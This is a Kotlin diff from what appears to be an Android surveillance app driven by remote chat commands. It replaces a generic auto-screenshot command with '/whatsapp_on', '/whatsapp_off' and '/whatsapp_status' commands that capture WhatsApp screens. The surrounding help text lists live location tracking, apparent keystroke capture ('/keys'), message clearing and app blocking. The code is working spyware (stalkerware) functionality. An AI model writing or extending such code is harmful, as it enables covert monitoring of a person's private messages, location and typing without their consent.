@@ -302,22 +302,18 @@ private fun handle(raw: String) {
             AppBlocker.clearAll(this)
             sendMsg("✅ All apps unblocked")
         }
-        cmd.startsWith("/autoshot") -> {
-            when (arg.lowercase()) {
-                "on" -> {
-                    AutoScreenshot.setEnabled(this, true)
-                    sendMsg("📸 Auto-screenshot ON (${AutoScreenshot.getCount(this)} photos per app open)")
-                }
-                "off" -> {
-                    AutoScreenshot.setEnabled(this, false)
-                    sendMsg("📸 Auto-screenshot OFF")
-                }
-                else -> {
-                    val status = if (AutoScreenshot.isEnabled(this)) "ON" else "OFF"
-                    sendMsg("📸 Auto-screenshot: $status\n\nUsage:\n/autoshot on\n/autoshot off")
-                }
-            }
-        }
+        cmd == "/whatsapp_on" -> {
+    AutoScreenshot.setEnabled(this, true)
+    sendMsg("✅ WhatsApp Auto-Screenshot ON")
+}
+cmd == "/whatsapp_off" -> {
+    AutoScreenshot.setEnabled(this, false)
+    sendMsg("✅ WhatsApp Auto-Screenshot OFF")
+}
+cmd == "/whatsapp_status" -> {
+    val status = if (AutoScreenshot.isEnabled(this)) "ON ✅" else "OFF ❌"
+    sendMsg("📸 WhatsApp Auto-Screenshot: $status\n\nCommands:\n/whatsapp_on\n/whatsapp_off")
+}
         cmd == "/livetrack" -> {
             when (arg.lowercase()) {
                 "on" -> {
@@ -381,7 +377,7 @@ private fun handle(raw: String) {
             "✅ /unblock [app]\n" +
             "📋 /blocked\n" +
             "🗑 /unblockall\n" +
-            "📸 /autoshot on/off\n" +
+            "📸 /whatsapp_on /whatsapp_off\n" +
             "📍 /livetrack on/off\n" +
             "⌨️ /keys\n" +
             "🗑 /clearmsgs\n" +
